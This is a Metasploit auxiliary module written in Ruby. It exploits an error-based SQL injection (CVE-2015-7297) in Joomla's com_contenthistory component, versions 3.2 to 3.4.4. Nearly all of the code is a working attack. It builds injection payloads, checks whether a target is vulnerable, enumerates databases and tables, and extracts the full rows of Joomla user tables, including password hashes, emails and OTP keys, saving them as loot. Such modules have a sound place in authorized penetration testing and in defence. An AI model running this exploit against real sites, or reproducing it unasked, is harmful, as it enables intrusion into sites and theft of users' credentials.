##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability in Joomla versions 3.2
        through 3.4.4 in order to either enumerate usernames and password hashes.
      },
      'References'     =>
        [
          ['CVE', '2015-7297'],
          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/']
        ],
      'Author'         =>
        [
          'Asaf Orpani', # discovery
          'bperry',      # metasploit module
          'Nixawk'       # module review
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 22 2015'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])
      ])
  end

  def check
    flag = Rex::Text.rand_text_alpha(8)
    lmark = Rex::Text.rand_text_alpha(5)
    rmark = Rex::Text.rand_text_alpha(5)

    payload = 'AND (SELECT 8146 FROM(SELECT COUNT(*),CONCAT('
    payload << "0x#{lmark.unpack('H*')[0]},"
    payload << "(SELECT 0x#{flag.unpack('H*')[0]}),"
    payload << "0x#{rmark.unpack('H*')[0]},"
    payload << 'FLOOR(RAND(0)*2)'
    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'

    res = sqli(payload)

    if res && res.code == 500 && res.body =~ /#{lmark}#{flag}#{rmark}/
      Msf::Exploit::CheckCode::Vulnerable
    else
      Msf::Exploit::CheckCode::Safe
    end
  end

  def request(query, payload, lmark, rmark)
    query = "#{payload}" % query
    res = sqli(query)

    # Error based SQL Injection
    if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/
      $1
    end
  end

  def query_databases(payload, lmark, rmark)
    dbs = []

    query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '
    query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'

    dbc = request(query, payload, lmark, rmark)

    query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '
    query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'

    0.upto(dbc.to_i - 1) do |i|
      dbname = request(query_fmt % i, payload, lmark, rmark)
      dbs << dbname
      vprint_good(dbname)
    end

    %w(performance_schema information_schema mysql).each do |dbname|
      dbs.delete(dbname) if dbs.include?(dbname)
    end

    dbs
  end

  def query_tables(database, payload, lmark, rmark)
    tbs = []

    query = '(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) '
    query << 'FROM INFORMATION_SCHEMA.TABLES '
    query << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}))"

    tbc = request(query, payload, lmark, rmark)

    query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '
    query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '
    query_fmt << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}) "
    query_fmt << 'LIMIT %d,1)'

    vprint_status('tables in database: %s' % database)
    0.upto(tbc.to_i - 1) do |i|
      tbname = request(query_fmt % i, payload, lmark, rmark)
      vprint_good(tbname)
      tbs << tbname if tbname =~ /_users$/
    end

    tbs
  end

  def query_columns(database, table, payload, lmark, rmark)
    cols = []
    query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"

    colc = request(query, payload, lmark, rmark)
    vprint_status(colc)

    valid_cols = [   # joomla_users
      'activation',
      'block',
      'email',
      'id',
      'lastResetTime',
      'lastvisitDate',
      'name',
      'otep',
      'otpKey',
      'params',
      'password',
      'registerDate',
      'requireReset',
      'resetCount',
      'sendEmail',
      'username'
    ]

    query_fmt = '(SELECT MID((IFNULL(CAST(%s AS CHAR),0x20)),%d,54) '
    query_fmt << "FROM #{database}.#{table} ORDER BY id LIMIT %d,1)"

    0.upto(colc.to_i - 1) do |i|
      record = {}
      valid_cols.each do |col|
        l = 1
        record[col] = ''
        loop do
          value = request(query_fmt % [col, l, i], payload, lmark, rmark)
          break if value.blank?
          record[col] << value
          l += 54
        end
      end
      cols << record
      vprint_status(record.to_s)
    end

    cols
  end

  def run
    lmark = Rex::Text.rand_text_alpha(5)
    rmark = Rex::Text.rand_text_alpha(5)

    payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
    payload << "0x#{lmark.unpack('H*')[0]},"
    payload << '%s,'
    payload << "0x#{rmark.unpack('H*')[0]},"
    payload << 'FLOOR(RAND(0)*2)'
    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'

    dbs = query_databases(payload, lmark, rmark)
    dbs.each do |db|
      tables = query_tables(db, payload, lmark, rmark)
      tables.each do |table|
        cols = query_columns(db, table, payload, lmark, rmark)
        next if cols.blank?
        path = store_loot(
          'joomla.users',
          'text/plain',
          datastore['RHOST'],
          cols.to_json,
          'joomla.users')
        print_good('Saved file to: ' + path)
      end
    end
  end

  def sqli(payload)
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_contenthistory',
        'view' => 'history',
        'list[ordering]' => '',
        'item_id' => 1,
        'type_id' => 1,
        'list[select]' => '1 ' + payload
      }
    )
  end
end
